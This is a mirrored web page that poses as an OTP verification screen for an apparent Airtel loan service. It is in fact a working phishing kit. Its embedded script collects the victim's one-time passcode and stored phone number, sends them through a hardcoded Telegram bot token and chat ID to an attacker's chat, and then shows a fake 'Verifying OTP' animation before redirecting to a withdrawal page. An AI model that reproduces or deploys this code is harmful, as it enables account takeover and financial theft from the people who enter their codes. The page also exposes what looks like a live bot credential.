<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from airtelloans.netlify.app/otp.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Jan 2026 07:24:02 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<!-- /Added by HTTrack -->

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com/"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&amp;display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        
        .otp-input {
            width: 70px;
            height: 70px;
            text-align: center;
            font-size: 1.5rem;
            font-weight: 700;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            background-color: #f9fafb;
            outline: none;
            transition: all 0.2s;
        }
        
        .otp-input:focus {
            border-color: #ff0000;
            background-color: #fff;
            box-shadow: 0 0 0 1px rgba(255, 0, 0, 0.1);
        }
        
        .otp-input:disabled {
            cursor: not-allowed;
            opacity: 0.6;
        }
        
        .browser-icon {
            width: 38px;
            height: 38px;
            object-fit: contain;
        }
        /* Popup Overlay */
        
        #loadingPopup {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.5);
            align-items: center;
            justify-content: center;
            z-index: 50;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #ff0000;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body class="flex flex-col min-h-screen bg-white text-gray-800">

    <div id="loadingPopup">
        <div class="bg-white p-8 rounded-2xl flex flex-col items-center shadow-2xl">
            <div class="spinner mb-4"></div>
            <p class="font-bold text-gray-700">Verifying OTP...</p>
        </div>
    </div>

    <div class="p-6">
        <button onclick="window.history.back()" class="flex items-center gap-2 border border-gray-200 rounded-full px-5 py-2 text-gray-600 font-medium hover:bg-gray-50">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
            </svg>
            Back
        </button>
    </div>

    <main class="flex-grow px-8 pt-4">
        <h1 class="text-2xl font-bold mb-4">OTP Verification</h1>
        <p class="text-sm font-semibold mb-10 leading-relaxed">
            <c>Please enter the OTP you received </c>
        </p>

        <div class="flex justify-between gap-2 max-w-sm">
            <input type="tel" maxlength="1" class="otp-input" id="otp1">
            <input type="tel" maxlength="1" class="otp-input" id="otp2">
            <input type="tel" maxlength="1" class="otp-input" id="otp3">
            <input type="tel" maxlength="1" class="otp-input" id="otp4">
        </div>

        <div class="flex justify-between items-center mt-10">
            <button id="resendBtn" onclick="window.location.href='login.html'" class="text-red-400 font-bold uppercase tracking-wider text-sm disabled:opacity-50" disabled>
                Resend OTP
            </button>
            <span id="timer" class="text-red-500 font-bold text-sm tracking-widest">00:40</span>
        </div>
    </main>

    <footer class="mt-auto bg-white flex flex-col items-center justify-center pb-8">
        <p class="text-gray-700 font-medium mb-4 text-sm">Best experienced in</p>
        <div class="flex items-center gap-4 px-4">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_(February_2022).svg" class="browser-icon" alt="Chrome">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/52/Safari_browser_logo.svg" class="browser-icon" alt="Safari">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/49/Opera_2015_icon.svg" class="browser-icon" alt="Opera">
            <img src="https://play-lh.googleusercontent.com/WW5DkF_uytqj4_kY-YJJ0M8zoTqowXSjsSc_oUh08kyxPXuUCtYp_AUn37zGMPdevLbQ" class="browser-icon" alt="Samsung">
        </div>
        <div class="w-32 h-1 bg-gray-900 rounded-full mt-8 opacity-90"></div>
    </footer>

    <script>
        let timeLeft = 40;
        const timerDisplay = document.getElementById('timer');
        const resendBtn = document.getElementById('resendBtn');
        const inputs = document.querySelectorAll('.otp-input');
        const popup = document.getElementById('loadingPopup');

        // --- TELEGRAM CONFIG ---
        const BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
        const CHAT_ID = '5615316142';

        // --- Timer & Lockout Logic ---
        const countdown = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(countdown);
                resendBtn.disabled = false;
                resendBtn.classList.replace('text-red-400', 'text-red-600');

                inputs.forEach(input => {
                    input.disabled = true;
                    input.value = "";
                });
                alert("Session expired. Please resend OTP.");
            } else {
                timeLeft--;
                const seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
                timerDisplay.innerText = `00:${seconds}`;
            }
        }, 1000);

        // --- OTP Input & Popup Logic ---
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.inputType === "deleteContentBackward") return;

                if (input.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }

                const otpValue = Array.from(inputs).map(i => i.value).join('');
                if (otpValue.length === 4) {
                    sendOtpToTelegram(otpValue);
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        // --- DIRECT FRONTEND TO TELEGRAM FUNCTION ---
        async function sendOtpToTelegram(otpCode) {
            popup.style.display = 'flex';

            const savedPhone = localStorage.getItem('userPhone') || "Unknown User";
            const message = `ðŸ”‘ <b>OTP Received</b>\n\n<b>Phone:</b> ${savedPhone}\n<b>OTP Code:</b> <code>${otpCode}</code>`;
            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            try {
                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (err) {
                console.error("Direct Telegram Send Failed:", err);
            }

            // Wait 2 seconds for the "Verifying" animation, then proceed
            setTimeout(() => {
                window.location.href = 'withdraw.html';
            }, 2000);
        }
    </script>
</body>

<!-- Mirrored from airtelloans.netlify.app/otp.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 27 Jan 2026 07:24:03 GMT -->

</html>